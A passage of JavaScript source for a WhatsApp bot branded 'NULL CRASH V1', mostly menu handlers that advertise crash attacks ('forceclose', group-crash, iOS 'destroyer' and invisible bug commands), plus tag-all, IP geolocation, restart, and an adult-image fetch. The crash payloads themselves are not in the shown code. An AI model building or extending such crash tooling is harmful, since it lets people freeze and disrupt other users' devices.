┃ ⤷ ᴅᴇᴠ       : ᴄᴏᴅᴇʙʀᴇᴀᴋᴇʀ
╰━━━━━━━━━━━━━━━━━━━━━━━━╯
╭─「 𝐈𝐍𝐕𝐈𝐒 𝐁𝐔𝐆 」─╮
┃ ⤷ ɪɴᴠɪꜱ-ᴅᴏᴢᴇʀ
┃ ⤷ ɪɴᴠɪꜱ-ᴄᴏᴍʙᴏ
┃ ⤷ ɪɴᴠɪꜱ-ᴜʟᴛʀᴀ
┃ ⤷ ɪɴᴠɪꜱ-ᴀᴛᴛᴀᴄᴋ
┃ ⤷ ɪɴᴠɪꜱ-ʙᴜʟʟᴅᴏᴢᴇʀ
╰──────────────────────╯
`;

    const imageUrl = "https://files.catbox.moe/a66dm5.jpg";

    await nato.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: BugmenuText,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363423407628679@newsletter',
                    newsletterName: 'N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1',
                    serverMessageId: 143
                }
            }
        },
        { quoted: bayzoffc }
    );
    break;
}

case 'forceclosebug': {
    await nato.sendMessage(from, { react: { text: "💥", key: m.key } });
   
    const BugmenuText = `
╭━ ❖ 「 N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1 」❖ ━━╮
┃ ⤷ ᴜsᴇʀ      : @${sender.split("@")[0]}
┃ ⤷ ᴠᴇʀsɪᴏɴ   : *4.0.0*
┃ ⤷ ᴅᴇᴠ       : ᴄᴏᴅᴇʙʀᴇᴀᴋᴇʀ
╰━━━━━━━━━━━━━━━━━━━━━━━━╯
╭─「 𝐅𝐎𝐑𝐂𝐄𝐂𝐋𝐎𝐒𝐄 𝐁𝐔𝐆 」─╮
┃ ⤷ ꜰᴄ-ꜱᴜᴘʀᴇᴍᴇ
┃ ⤷ ꜰᴄ-ᴏɴᴇ
┃ ⤷ ꜰᴄ-ɪɴꜰɪɴɪᴛʏ
┃ ⤷ ꜰᴄ-ɴᴇᴡ
┃ ⤷ ꜰᴏʀᴄᴇᴄʟᴏꜱᴇ
╰──────────────────────╯
`;

    const imageUrl = "https://files.catbox.moe/a66dm5.jpg";

    await nato.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: BugmenuText,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363423407628679@newsletter',
                    newsletterName: 'N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1',
                    serverMessageId: 143
                }
            }
        },
        { quoted: bayzoffc }
    );
    break;
}
        
case 'buggroup': {
    await nato.sendMessage(from, { react: { text: "💢", key: m.key } });
   
    const BugmenuText = `
╭━ ❖ 「 N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1 」❖ ━━╮
┃ ⤷ ᴜsᴇʀ      : @${sender.split("@")[0]}
┃ ⤷ ᴠᴇʀsɪᴏɴ   : *4.0.0*
┃ ⤷ ᴅᴇᴠ       : ᴄᴏᴅᴇʙʀᴇᴀᴋᴇʀ
╰━━━━━━━━━━━━━━━━━━━━━━━━╯
╭─「 𝐆𝐑𝐎𝐔𝐏 𝐁𝐔𝐆 」─╮
┃ ⤷ xᴄʀᴀsʜ-ɢᴄ
┃ ⤷ ᴄʀᴀsʜ-ɢᴄ
┃ ⤷ ʙʟᴀɴᴋ-ɢᴄ
┃ ⤷ ꜰᴄ-ɢᴄ
┃ ⤷ xɢʀᴏᴜᴘ
╰──────────────────────╯
`;

    const imageUrl = "https://files.catbox.moe/a66dm5.jpg";

    await nato.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: BugmenuText,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363423407628679@newsletter',
                    newsletterName: 'N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1',
                    serverMessageId: 143
                }
            }
        },
        { quoted: bayzoffc }
    );
    break;
}
        
case 'emojibug': {
    await nato.sendMessage(from, { react: { text: "👾", key: m.key } });
   
    const BugmenuText = `
╭━ ❖ 「 N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1 」❖ ━━╮
┃ ⤷ ᴜsᴇʀ      : @${sender.split("@")[0]}
┃ ⤷ ᴠᴇʀsɪᴏɴ   : *4.0.0*
┃ ⤷ ᴅᴇᴠ       : ᴄᴏᴅᴇʙʀᴇᴀᴋᴇʀ
╰━━━━━━━━━━━━━━━━━━━━━━━━╯
╭─「 𝐄𝐌𝐎𝐉𝐈 𝐁𝐔𝐆 」─╮
┃ ⤷ 💥
┃ ⤷ 😠
┃ ⤷ 🗿
┃ ⤷ 😑
┃ ⤷ ☠️
╰──────────────────────╯
`;

    const imageUrl = "https://files.catbox.moe/a66dm5.jpg";

    await nato.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: BugmenuText,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363423407628679@newsletter',
                    newsletterName: 'N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1',
                    serverMessageId: 143
                }
            }
        },
        { quoted: bayzoffc }
    );
    break;
}
        
case 'iosbug': {
    await nato.sendMessage(from, { react: { text: "💀", key: m.key } });
   
    const BugmenuText = `
╭━ ❖ 「 N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1 」❖ ━━╮
┃ ⤷ ᴜsᴇʀ      : @${sender.split("@")[0]}
┃ ⤷ ᴠᴇʀsɪᴏɴ   : *1.0.0*
┃ ⤷ ᴅᴇᴠ       : ᴄᴏᴅᴇʙʀᴇᴀᴋᴇʀ
╰━━━━━━━━━━━━━━━━━━━━━━━━╯
╭─「 𝐈𝐎𝐒 𝐁𝐔𝐆 」─╮
┃ ⤷ ɪᴏꜱ-ʙʀᴜᴛᴀʟɪᴛʏ
┃ ⤷ ᴅᴇꜱᴛʀᴏʏᴇʀ-ɪᴏꜱ
┃ ⤷ ᴀᴛᴛᴀᴄᴋ-ɪᴏꜱ
┃ ⤷ ɪᴏꜱ-ɪɴᴠᴀꜱɪᴏɴ
┃ ⤷ ɪᴏꜱ-ᴄᴏᴍʙᴏ
╰──────────────────────╯
`;

    const imageUrl = "https://files.catbox.moe/a66dm5.jpg";

    await nato.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: BugmenuText,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363423407628679@newsletter',
                    newsletterName: 'N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1',
                    serverMessageId: 143
                }
            }
        },
        { quoted: bayzoffc }
    );
    break;
}
 
 
case 'ownermenu': {
    await nato.sendMessage(from, { react: { text: "👑", key: m.key } });
   
    const OwnermenuText = `
╭━ ❖ 「 N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1 」❖ ━━╮
┃ ⤷ ᴜsᴇʀ      : @${sender.split("@")[0]}
┃ ⤷ ᴠᴇʀsɪᴏɴ   : *1.0.0*
┃ ⤷ ᴅᴇᴠ       : ᴄᴏᴅᴇʙʀᴇᴀᴋᴇʀ
╰━━━━━━━━━━━━━━━━━━━━━━━━╯
╭─「 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 」─╮
┃ ⤷ ᴄʀᴇᴀᴛᴏʀ
┃ ⤷ ᴛᴀɢᴀʟʟ
┃ ⤷ ᴘɪɴɢ
┃ ⤷ ʀᴇꜱᴛᴀʀᴛ
╰──────────────────────╯
`;

    const imageUrl = "https://files.catbox.moe/mks77q.jpg";

    await nato.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: OwnermenuText,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363423407628679@newsletter',
                    newsletterName: 'N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1',
                    serverMessageId: 143
                }
            }
        },
        { quoted: bayzoffc }
    );
    break;
}
//============================
case "creator": {
const menu = `
⚡ *The Developer Behind the Name*

*Full Name: Mbaneme Wealth*
*Professional Alias: ᴄᴏᴅᴇʙʀᴇᴀᴋᴇʀ 
*Specialization: Full-Stack Development & Digital Architecture*
*Philosophy: "Building bridges between ideas and exceptional digital realities*"


📬 *CONNECT WITH ME*

🌐 *Primary Channels*

· 💼 *Professional Profile: t.me/knoxprime*
`
nato.sendMessage(m.chat, {text: menu}, {quoted: bayzoffc})
}
break

case 'tagall': {
                if (!isGroup) return reply('Group specific features!');
                let teks = `*👥 HELLO EVERYONE*
 
                 🗞️ *ᴍᴇssᴀɢᴇ : ${q ? q : ''}*\n\n`
                for (let mem of participants) {
                    teks += `™ @${mem.id.split('@')[0]}\n`
                }
                nato.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: bayzoffc
                })
                }
                break
                
                
case 'ping':
                          case 'p':
  await nato.sendMessage(from, { react: { text: '⌚', key: m.key } });
                            {
                              
                                   async function loading (jid) {
                             
                                    let start = new Date;
                                    let { key } = await nato.sendMessage(jid, {text: 'Checking latency.....'})
                                    let done = new Date - start;
                                    var lod = `*Pong*:\n> ⏱️ ${done}ms (${Math.round(done / 100) / 10}s)`
                                    
                                    await sleep(1000)
                                    await nato.sendMessage(jid, {text: lod, edit: key });
                                    }
                                    loading(from)
                                   
                            }       
                            break;

case "restart": case "rst": case "restartbot": {
  
  await reply("_restart server_ . . .")
  var file = await fs.readdirSync("./session")
  var anu = await file.filter(i => i !== "creds.json")
  for (let t of anu) {
    await fs.unlinkSync(`./session/${t}`)
  }
  await reply("Restarting bot...")
  process.exit(0)
}
break

case "hentai-random": {
  const anu = `https://archive-ui.tanakadomp.biz.id/asupan/anime`;
  const response = await axios.get(anu, { responseType: 'arraybuffer' })
  try {
    nato.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: ' 𝗛𝗲𝗻𝘁𝗮𝗶 ! '
    }, { quoted: m })
  } catch (err) {
    console.log(err);
    m.reply('undefined')
  }
}
break

case 'trackip': {
    if (!args[0]) return reply(`Format: ${prefix}trackip <IP>`);
    let ip = args[0];
    try {
        const res = await fetch(`https://ipwhois.app/json/${ip}`);
        const data = await res.json();

        if (!data.success) return reply("❌ Error: Invalid IP");

        let text = `
📍 *IP Tracking Result*
- IP: ${data.ip}
- Country: ${data.country}
- Region: ${data.region}
- City: ${data.city}
- ZIP: ${data.postal}
- Timezone: ${data.timezone_gmt}
- ISP: ${data.isp}
- Org: ${data.org}
- ASN: ${data.asn}
- Lat/Lon: ${data.latitude}, ${data.longitude}
        `;

        
        await nato.sendMessage(m.chat, { text });

        
        let mapLink = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;
        await nato.sendMessage(m.chat, { text: `🌍 View Map: ${mapLink}` });

    } catch (err) {
        console.log(err);
        reply("❌ Failed to find IP.");
    }
}
break;

case 'request': case 'reportbug': {
	if (!text) return reply(`Example : ${
         command
      } Hi developer one command not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\nHi ${m.sender}, Your request has been forwarded to my Owner*.\n*Please wait...*`
            for (let i of owner) {
nato.sendMessage(i + "@s.whatsapp.net", {
text: textt + teks1,
mentions: [m.sender],
}, {
quoted: bayzoffc,
})
            }
            nato.sendMessage(m.chat, {
text: textt + teks2 + teks1,
mentions: [m.sender],
            }, {
quoted: bayzoffc,
            })

        }
        break;



//=============≠≠==========
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}